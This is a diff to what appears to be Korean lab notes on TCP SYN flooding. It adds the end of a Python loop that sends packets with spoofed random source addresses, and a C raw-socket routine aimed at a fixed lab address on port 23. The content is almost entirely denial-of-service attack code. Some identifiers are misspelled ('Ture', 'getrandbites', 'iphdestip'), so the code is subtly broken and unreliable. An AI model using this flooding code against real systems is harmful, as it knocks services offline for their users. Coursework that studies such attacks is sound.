@@ -183,5 +183,33 @@ while Ture:
 	pkt[IP].src = str(IPv4Address(getrandbites(32)))
 	pkt[TCP].sport = getrandbites(16)
 	pkt[TCP].seq = getrandbites(32)
-	send
+	send(pkt, verbose = 0)
+```
+## C 프로그램(tcp_syn_flooding.c)
+```c
+#define DEST_IP "10.0.2.69"
+#define DEST_PORT 23
+#define PACKET_LEN 1500
+
+// Given an IP packet, send it out using a raw socket.
+void send_raw_ip_packet(struct ipheader* ip)
+{
+	struct sockaddr_in dest_info;
+	int enable = 1;
+	
+	// 1. Create a raw network socket.
+	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	
+	// 2. Set socket option
+	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
+	
+	// 3. Provide needed information about destination.
+	dest_info.sin_family = AF_INET;
+	dest_info.sin_addr = ip->iphdestip;
+	
+	// 4. Send the packet out.
+	sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
+	close(sock);
+}
+
 ```
